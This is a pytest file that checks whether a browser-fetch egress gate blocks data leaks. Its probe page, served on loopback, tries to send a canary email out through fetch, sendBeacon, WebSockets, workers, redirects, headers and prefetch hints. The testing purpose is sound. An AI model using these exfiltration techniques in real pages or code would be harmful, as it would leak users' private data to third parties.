"""Live leak probe for real-browser reads: launches the installed Edge.

Opt-in, because it opens a real (off-screen) browser window:
``SIFTFETCH_BROWSER_TESTS=1 python -m pytest src/siftfetch/browser_fetch_live.py.test``.
Everything stays on 127.0.0.1. A probe page tries every way out it can; with
the gate on, nothing may reach the sink. The control run, with the gate off,
shows that the same page does reach it, so a pass means the gate held, not
that the probe was broken.
"""

import json
import os
import threading
import time
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

import pytest

from siftfetch import browser_fetch as bf
from siftfetch import egress_policy as ep

pytestmark = pytest.mark.skipif(os.environ.get("SIFTFETCH_BROWSER_TESTS") != "1",
                                reason="launches a real browser; set SIFTFETCH_BROWSER_TESTS=1")
pytest.importorskip("playwright")

EMAIL = "jordan.tv.canary@example.net"

PROBE = """<!doctype html><html><head><title>Probe</title>
<link rel="preconnect" href="http://127.0.0.1:{sink}/preconnect">
<link rel="dns-prefetch" href="http://127.0.0.1:{sink}/">
</head><body><main><h1>Release notes</h1><p>Version 2 fixes streaming.</p>
<iframe src="http://127.0.0.1:{sink}/iframe"></iframe>
<script>
const S = "http://127.0.0.1:{sink}";
const L = location.origin;
fetch(S + "/fetch").catch(() => {{}});
navigator.sendBeacon(S + "/beacon", "{email}");
try {{ new WebSocket("ws://127.0.0.1:{sink}/ws"); }} catch (e) {{}}
try {{ new EventSource(S + "/eventsource"); }} catch (e) {{}}
const w = new Blob(['fetch("' + S + '/worker").catch(()=>{{}})'], {{type: "text/javascript"}});
try {{ new Worker(URL.createObjectURL(w)); }} catch (e) {{}}
fetch(L + "/redir").catch(() => {{}});
fetch(L + "/post", {{method: "POST", body: "{email}"}}).catch(() => {{}});
fetch(L + "/header", {{headers: {{"X-Contact": "{email}"}}}}).catch(() => {{}});
fetch(L + "/options", {{method: "OPTIONS", body: "{email}"}}).catch(() => {{}});
try {{ window.open(S + "/open"); }} catch (e) {{}}
</script></main></body></html>"""


class _Recorder(BaseHTTPRequestHandler):
    seen: list[tuple[int, str, str]] = []
    probe = ""
    sink_port = 0

    def _record(self):
        type(self).seen.append((self.server.server_address[1], self.command, self.path))

    def do_GET(self):  # noqa: N802
        self._record()
        if self.path == "/probe":
            body, status = type(self).probe.encode(), 200
        elif self.path == "/redir":
            self.send_response(302)
            self.send_header("Location", f"http://127.0.0.1:{type(self).sink_port}/redirected")
            self.send_header("Content-Length", "0")
            self.end_headers()
            return
        else:
            body, status = b"ok", 200
        self.send_response(status)
        self.send_header("Content-Type", "text/html")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    do_POST = do_OPTIONS = do_HEAD = do_GET  # noqa: N815

    def log_message(self, *args):
        pass


@pytest.fixture
def probe(tmp_path, monkeypatch):
    page = ThreadingHTTPServer(("127.0.0.1", 0), _Recorder)
    sink = ThreadingHTTPServer(("127.0.0.1", 0), _Recorder)
    for server in (page, sink):
        threading.Thread(target=server.serve_forever, daemon=True).start()
    page_port, sink_port = page.server_address[1], sink.server_address[1]
    _Recorder.seen = []
    _Recorder.sink_port = sink_port
    _Recorder.probe = PROBE.format(sink=sink_port, email=EMAIL)
    monkeypatch.setenv("SIFTFETCH_HOME", str(tmp_path))
    monkeypatch.setattr(ep, "_cached", None)
    bf._reads.clear()
    (tmp_path / "identifiers.json").write_text(json.dumps({"version": 1, "values": [
        {"label": "canary_email", "kind": "email", "value": EMAIL, "class": "exact"}]}),
        encoding="utf-8")
    # Only the probe page's origin is listed; the sink is an unlisted loopback port.
    (tmp_path / "config.json").write_text(json.dumps({
        "local_endpoints": [{"scheme": "http", "host": "127.0.0.1", "port": page_port,
                             "service": "probe", "allowed_ops": ["fetch"]}],
        "browser_fetch": {"mode": "on-wall", "window": "offscreen"}}), encoding="utf-8")
    yield f"http://127.0.0.1:{page_port}/probe", page_port, sink_port
    page.shutdown()
    sink.shutdown()


def _hits(port):
    return sorted({path for p, _, path in _Recorder.seen if p == port})


def test_gate_on_nothing_reaches_the_sink(probe):
    url, page_port, sink_port = probe
    read = bf.read_page(url)
    time.sleep(2)  # let any late request land before looking
    assert "Version 2 fixes streaming" in read.html
    assert _hits(sink_port) == []
    page_hits = _hits(page_port)
    assert "/post" not in page_hits and "/header" not in page_hits
    assert "/options" not in page_hits
    assert "/probe" in page_hits


def test_control_gate_off_the_same_page_leaks(probe):
    from playwright.sync_api import sync_playwright
    url, page_port, sink_port = probe
    with sync_playwright() as pw:
        browser = pw.chromium.launch(channel="msedge", headless=False,
                                     args=bf._window_args("offscreen"))
        try:
            page = browser.new_context().new_page()
            page.goto(url, wait_until="domcontentloaded")
            page.wait_for_timeout(3_000)
        finally:
            browser.close()
    leaked = _hits(sink_port)
    assert {"/fetch", "/redirected"} <= set(leaked), leaked
    assert "/post" in _hits(page_port) and "/header" in _hits(page_port)
    assert "/options" in _hits(page_port)


def test_control_route_gate_alone_misses_the_redirect(probe, monkeypatch):
    # route() never sees redirect hops. With the proxy taken out of
    # the launch, the redirected request reaches the sink; with it, it doesn't
    # (test_gate_on_nothing_reaches_the_sink).
    from siftfetch import egress_proxy
    monkeypatch.setattr(egress_proxy.EgressProxy, "launch_args", property(lambda self: []))
    url, page_port, sink_port = probe
    bf.read_page(url)
    time.sleep(2)
    assert "/redirected" in _hits(sink_port)


def test_browser_never_resolves_names_itself(probe, monkeypatch, tmp_path):
    # With an HTTP proxy Chromium should leave every lookup to the proxy,
    # including dns-prefetch and preconnect. The NetLog shows any lookup the
    # browser makes itself.
    name = "dnsprobe-sift.example"
    netlog = tmp_path / "netlog.json"
    url, page_port, sink_port = probe
    _Recorder.probe = (
        f'<html><head><link rel="dns-prefetch" href="//{name}">'
        f'<link rel="preconnect" href="https://{name}"></head><body><p>x</p>'
        f'<script>fetch("https://{name}/f").catch(()=>{{}})</script></body></html>')
    monkeypatch.setattr(bf, "_CLOSED_SIDE_CHANNELS",
                        bf._CLOSED_SIDE_CHANNELS + [f"--log-net-log={netlog}",
                                                    "--net-log-capture-mode=Everything"])
    bf.read_page(url)
    time.sleep(1)
    log = netlog.read_text(encoding="utf-8", errors="replace")
    assert name in log  # the browser did try to reach it (through the proxy)
    events = json.loads(log if log.rstrip().endswith("}") else log.rstrip().rstrip(",") + "]}")
    types = {v: k for k, v in events["constants"]["logEventTypes"].items()}
    # Chromium still asks its resolver, but a lookup that may touch the
    # network runs a system, DNS, secure-DNS or mDNS task (HostResolver task
    # types 0-3). Measured 2026-10-24, Edge with this proxy: lookups of the
    # name run only cache and hosts-file tasks [4, 9], then fail locally.
    network_tasks = {0, 1, 2, 3}
    pending: dict[int, bool] = {}
    leaks = []
    for e in events["events"]:
        kind, source = types.get(e["type"], ""), e["source"]["id"]
        if kind == "HOST_RESOLVER_MANAGER_REQUEST" and name in json.dumps(e.get("params", {})):
            pending[source] = True
        elif kind == "HOST_RESOLVER_MANAGER_TASK_SEQUENCE_CREATED" and pending.pop(source, False):
            if network_tasks & set(e["params"]["tasks"]):
                leaks.append(e["params"]["tasks"])
    assert leaks == []


def test_worker_requests_are_value_checked_in_the_browser(probe, monkeypatch):
    # Over https the proxy sees only the host, so a value in a path is caught
    # by route() alone. The proxy is taken out here so only route() decides.
    from siftfetch import egress_proxy
    monkeypatch.setattr(egress_proxy.EgressProxy, "launch_args", property(lambda self: []))
    url, page_port, sink_port = probe
    worker = (f'fetch("http://127.0.0.1:{page_port}/from-worker?c={EMAIL}").catch(()=>{{}});'
              f'fetch("http://127.0.0.1:{page_port}/clean-from-worker").catch(()=>{{}})')
    _Recorder.probe = ("<html><body><p>x</p><script>"
                       f"new Worker(URL.createObjectURL(new Blob([{worker!r}],"
                       "{type:'text/javascript'})));</script></body></html>")
    bf.read_page(url)
    time.sleep(2)
    hits = _hits(page_port)
    assert "/clean-from-worker" in hits  # control: the worker ran and could fetch
    assert not any(p.startswith("/from-worker") for p in hits)
